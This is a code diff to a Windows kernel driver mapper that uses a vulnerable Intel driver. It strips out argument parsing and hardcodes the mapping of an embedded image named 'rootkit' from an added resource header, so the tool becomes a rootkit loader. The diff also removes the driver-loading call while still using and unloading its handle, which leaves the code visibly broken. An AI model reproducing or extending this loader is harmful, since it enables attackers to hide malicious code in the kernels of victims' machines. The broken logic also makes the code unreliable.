@@ -1,4 +1,7 @@
+#define _CRT_SECURE_NO_WARNINGS
 #include "kdmapper.hpp"
+#include "rootkit_resource.hpp"
+#include <fstream>
 
 HANDLE iqvw64e_device_handle;
 
@@ -28,11 +31,6 @@ int paramExists(const int argc, wchar_t** argv, const wchar_t* param) {
 	return -1;
 }
 
-void help() {
-	Log(L"\r\n\r\n[!] Incorrect Usage!" << std::endl);
-	Log(L"[+] Usage: kdmapper.exe [--free][--mdl][--PassAllocationPtr] driver" << std::endl);
-}
-
 bool callbackExample(ULONG64* param1, ULONG64* param2, ULONG64 allocationPtr, ULONG64 allocationSize, ULONG64 mdlptr) {
 	UNREFERENCED_PARAMETER(param1);
 	UNREFERENCED_PARAMETER(param2);
@@ -53,57 +51,9 @@ bool callbackExample(ULONG64* param1, ULONG64* param2, ULONG64 allocationPtr, UL
 int wmain(const int argc, wchar_t** argv) {
 	SetUnhandledExceptionFilter(SimplestCrashHandler);
 
-	bool free = paramExists(argc, argv, L"free") > 0;
-	bool mdlMode = paramExists(argc, argv, L"mdl") > 0;
-	bool passAllocationPtr = paramExists(argc, argv, L"PassAllocationPtr") > 0;
-
-	if (free) {
-		Log(L"[+] Free pool memory after usage enabled" << std::endl);
-	}
-
-	if (mdlMode) {
-		Log(L"[+] Mdl memory usage enabled" << std::endl);
-	}
-
-	if (passAllocationPtr) {
-		Log(L"[+] Pass Allocation Ptr as first param enabled" << std::endl);
-	}
-
-	int drvIndex = -1;
-	for (int i = 1; i < argc; i++) {
-		if (std::filesystem::path(argv[i]).extension().string().compare(".sys") == 0) {
-			drvIndex = i;
-			break;
-		}
-	}
-
-	if (drvIndex <= 0) {
-		help();
-		return -1;
-	}
-
-	const std::wstring driver_path = argv[drvIndex];
-
-	if (!std::filesystem::exists(driver_path)) {
-		Log(L"[-] File " << driver_path << L" doesn't exist" << std::endl);
-		return -1;
-	}
-
-	iqvw64e_device_handle = intel_driver::Load();
-
-	if (iqvw64e_device_handle == INVALID_HANDLE_VALUE)
-		return -1;
-
-	std::vector<uint8_t> raw_image = { 0 };
-	if (!utils::ReadFileToMemory(driver_path, &raw_image)) {
-		Log(L"[-] Failed to read image to memory" << std::endl);
-		intel_driver::Unload(iqvw64e_device_handle);
-		return -1;
-	}
-
 	NTSTATUS exitCode = 0;
-	if (!kdmapper::MapDriver(iqvw64e_device_handle, raw_image.data(), 0, 0, free, true, mdlMode, passAllocationPtr, callbackExample, &exitCode)) {
-		Log(L"[-] Failed to map " << driver_path << std::endl);
+	if (!kdmapper::MapDriver(iqvw64e_device_handle, rootkit, 0, 0, false, true, false, false, callbackExample, &exitCode)) {
+		Log(L"[-] Failed to map rootkit" << std::endl);
 		intel_driver::Unload(iqvw64e_device_handle);
 		return -1;
 	}
